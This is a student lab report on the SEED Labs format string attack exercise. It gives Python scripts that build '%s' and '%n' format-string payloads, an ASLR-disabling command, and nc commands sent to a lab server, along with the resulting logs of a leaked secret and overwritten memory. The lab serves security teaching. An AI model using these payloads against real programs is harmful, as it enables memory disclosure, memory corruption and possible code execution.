# Format String Lab

## Introduction

In this week's lab, our group focused on the Format String Attack exercise from SEED Labs. The primary goal of our work was to demonstrate how unsafe use of format strings (for example, passing user-controlled data directly to `printf`) can be abused to read and write a program's memory, potentially enabling arbitrary code execution or privilege escalation.

For this exercise we followed the SEED tutorial and used the provided auxiliary files located in the `category-software/Format_String` directory of the SEED Labs repository on GitHub.

The report that follows documents command-by-command logs, payloads, debugger sessions, and explanations of why each vulnerability works at the OS level.

---

## Setup

We used the command `sudo sysctl -w kernel.randomize_va_space=0` to temporarily disable ASLR (Address Space Layout Randomization), making stack/heap addresses predictable to simplify exploit reproduction.

After that we went to the `Labsetup/server-code` directory and used these 2 commands:

1. `make`
2. `make install`

We wanted to compile the code by executing the commands in the `Makefile`.
We found warnings in the process but the SEED Lab said we can ignore those warnings for now.

To finish the setup we tested the commands:

- `dcbuild`
- `dcup`

To build and start the containers.

## Task 1

We sent a string to the server running the 32-bit program with the Format String vulnerability with the command `echo hello | nc 10.9.0.5 9090` and then finished the command by pressing `Ctrl + C`.

To crash the `myprintf()` function, we just used `echo "%n" | nc 10.9.0.5 9090`, because the `%n` tells printf to write to a pointer but without an argument, it writes to a random address, causing a crash.

But we could have used `python3 build_string.py` to create a file named `badfile`, then we would use the command `cat badfile | nc 10.9.0.5 9090` to have the same results, the `myprintf()` function would crash.

## Task 2.B

The objective of this task is to print a secret string that lives on the heap.

First we found the secret message's address in the server log `server-10.9.0.5 | The secret message's address:  0x080b4008`, now we needed that in the Little-Endian format, that we got it by using the code the lab provided:

```python
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
number  = 0xbfffeeee
content[0:4]  =  (number).to_bytes(4,byteorder='little')

# This line shows how to store a 4-byte string at offset 4
content[4:8]  =  ("abcd").encode('latin-1')

# This line shows how to construct a string s with
#   12 of "%.8x", concatenated with a "%n"
s = "%.8x"*12 + "%n"

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[8:8+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```

*But we modified it a little, to do what we needed*

```python
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

secret_address = 0x080b4008

# (little-endian)
content[0:4] = (secret_address).to_bytes(4, byteorder='little')

# Format String
s = "%64$s"

fmt = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

# Write the content to stdout (to use with a pipe)
sys.stdout.buffer.write(content)
```

And then we used the command `python3 2b.py | nc 10.9.0.5 9090`, and got:

```terminal
server-10.9.0.5 | Got a connection from 10.9.0.1
server-10.9.0.5 | Starting format
server-10.9.0.5 | The input buffer's address:    0xffffd0c0
server-10.9.0.5 | The secret message's address:  0x080b4008
server-10.9.0.5 | The target variable's address: 0x080e5068
server-10.9.0.5 | Waiting for user input ......
server-10.9.0.5 | Received 1500 bytes.
server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffcfe8
server-10.9.0.5 | The target variable's value (before): 0x11223344
server-10.9.0.5 |@
                 A secret message
server-10.9.0.5 | The target variable's value (after):  0x11223344
server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
```

And here we go, we got the secret message, it's "A secret message".

## Task 3

We want to remotely change the server's target variable, it currently holds 0x11223344. By modifying that value we can alter the program's behavior/control flow.

### Task 3.A

The objective is just to change the target variable value, it does not matter the value after.

We used the file `build_string.py` as the base for the code of 3A, at the end it looked like this:

```python
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

target_address = 0x080e5068

# (little-endian)
content[0:4] = (target_address).to_bytes(4, byteorder='little')

# First we print some characters, then we use %n
s = "AAAA%64$n" 

fmt = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

sys.stdout.buffer.write(content)
```

We then used that command: `python3 3A.py | nc 10.9.0.5 9090`

Which ended up being correct, because we got:

```terminal
server-10.9.0.5 | Got a connection from 10.9.0.1
server-10.9.0.5 | Starting format
server-10.9.0.5 | The input buffer's address:    0xffffd0c0
server-10.9.0.5 | The secret message's address:  0x080b4008
server-10.9.0.5 | The target variable's address: 0x080e5068
server-10.9.0.5 | Waiting for user input ......
server-10.9.0.5 | Received 1500 bytes.
server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffcfe8
server-10.9.0.5 | The target variable's value (before): 0x11223344
server-10.9.0.5 | hAAAAThe target variable's value (after):  0x00000008
server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
```

The target variable value is clearly different, as it changed to "0x00000008".

### Task 3.B

Now we need to change the target variable value to specifically "0x5000".

So we just applied some changes to the 3A python file:

```python
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

target_address = 0x080e5068

# (little-endian)
content[0:4] = (target_address).to_bytes(4, byteorder='little')

# We want to write 0x5000 = 20480 in decimal
# We already have 4 bytes of the address, so we need 20480 - 4 = 20476 more characters.
target_value = 0x5000  # 20480 in decimal
padding = target_value - 4 

# Construct a format string
# %.20476x prints a number with 20476 characters of padding
# %64$n writes the total number of characters to the address
s = f"%.{padding}x%64$n"

fmt = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

# Write to stdout
sys.stdout.buffer.write(content)
```

And we finished with the command `python3 3B.py | nc 10.9.0.5 9090`, that writes 20476 zeros to reach a total of 20480:

4 (address) + 20476 (padding) = 20480 (characters) = 0x5000 

```terminal
...00000000000000000000000000000000000000000000000000000000000000000000000000000000000000011223344The target variable's value (after):  0x00005000
server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
```
